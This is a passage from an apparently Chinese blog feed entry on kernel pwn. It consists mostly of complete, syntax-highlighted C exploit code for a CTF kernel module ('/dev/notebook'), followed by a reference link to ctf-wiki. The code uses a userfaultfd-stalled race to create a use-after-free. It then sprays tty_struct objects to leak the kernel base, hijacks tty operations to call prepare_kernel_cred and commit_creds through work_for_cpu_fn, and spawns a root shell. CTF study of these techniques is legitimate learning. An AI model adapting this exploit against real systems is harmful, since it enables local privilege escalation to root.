class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx, <span class="keyword">long</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx, <span class="keyword">long</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x300</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_chunk</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *stuck_mapped_memory;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_thread</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edit(idx, <span class="number">0</span>, stuck_mapped_memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_thread</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    create(idx, <span class="number">0x60</span>, stuck_mapped_memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Error opening /dev/notebook\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    stuck_mapped_memory = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">char</span> *buf_tty;</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    buf_tty = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&quot;a&quot;</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf_tty, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    create(<span class="number">0</span>, <span class="number">0x60</span>, buf);</span><br><span class="line">    create(<span class="number">1</span>, <span class="number">0x60</span>, buf);</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x500</span>, buf);</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x2e0</span>, buf);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit, thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (tty_fd &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ErrExit(<span class="string">&quot;[-] ptmx open failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        read(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf_tty == <span class="number">0x100005401</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct found! fd = %d\n&quot;</span>, tty_fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf_tty != <span class="number">0x100005401</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] leak failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ptm_unix98_ops_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> work_for_cpu_fn_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred_addr;</span><br><span class="line"></span><br><span class="line">    ptm_unix98_ops_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">if</span> ((ptm_unix98_ops_addr &amp; <span class="number">0xFFF</span>) == <span class="number">0x320</span>)</span><br><span class="line">        ptm_unix98_ops_addr += <span class="number">0x120</span>;</span><br><span class="line">    kernel_base = ptm_unix98_ops_addr - <span class="number">0xe8e440</span>;</span><br><span class="line">    work_for_cpu_fn_addr = <span class="number">0x9eb90</span> + kernel_base;</span><br><span class="line">    commit_creds_addr = <span class="number">0xa9b40</span> + kernel_base;</span><br><span class="line">    prepare_kernel_cred_addr = <span class="number">0xa9ef0</span> + kernel_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] ptm_unix98_ops addr leaked, addr: 0x%lx\n&quot;</span>, ptm_unix98_ops_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] work_for_cpu_fn addr leaked, addr: 0x%lx\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred addr leaked, addr: 0x%lx\n&quot;</span>, prepare_kernel_cred_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> chunk_arr[<span class="number">0x100</span>];</span><br><span class="line">    get_chunk(chunk_arr);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> note_0_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> note_1_addr;</span><br><span class="line">    note_0_addr = chunk_arr[<span class="number">0</span> * <span class="number">2</span>];</span><br><span class="line">    note_1_addr = chunk_arr[<span class="number">1</span> * <span class="number">2</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] note_1 addr leaked, addr: 0x%lx\n&quot;</span>, note_1_addr);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty) = <span class="number">0x100005401</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">3</span> * <span class="number">8</span>) = note_1_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">4</span> * <span class="number">8</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">5</span> * <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    write(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_operations[<span class="number">0x100</span>];</span><br><span class="line">    fake_operations[<span class="number">7</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    fake_operations[<span class="number">10</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    fake_operations[<span class="number">12</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    write(fd, fake_operations, <span class="number">1</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">    read(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred finished, return 0x%lx\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">6</span> * <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty) = <span class="number">0x100005401</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">3</span> * <span class="number">8</span>) = note_1_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">4</span> * <span class="number">8</span>) = commit_creds_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">5</span> * <span class="number">8</span>) = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">6</span> * <span class="number">8</span>);</span><br><span class="line">    write(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220816181101536.png"                      alt="image-20220816181101536"                ></p><hr><p>参考链接：<a class="link"   href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#_1" >https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#_1<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实这应该是kernelpwn基础中的一个，但是一直没有很关心，在最近做一道题目时又提到了这一利用方式，索性就把这玩意给先写了。&lt;/p&gt;
&lt;h3 id=&quot;简单理解&quot;&gt;&lt;a href=&quot;#简单理解&quot; class=&quot;headerlink&quot; title=&quot;简单理解&quot;&gt;&lt;/a&gt;简单</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="userfaultfd" scheme="https://cv196082.gitee.io/tags/userfaultfd/"/>
    
    <category term="tty_struct" scheme="https://cv196082.gitee.io/tags/tty-struct/"/>
    
  </entry>
  
</feed>
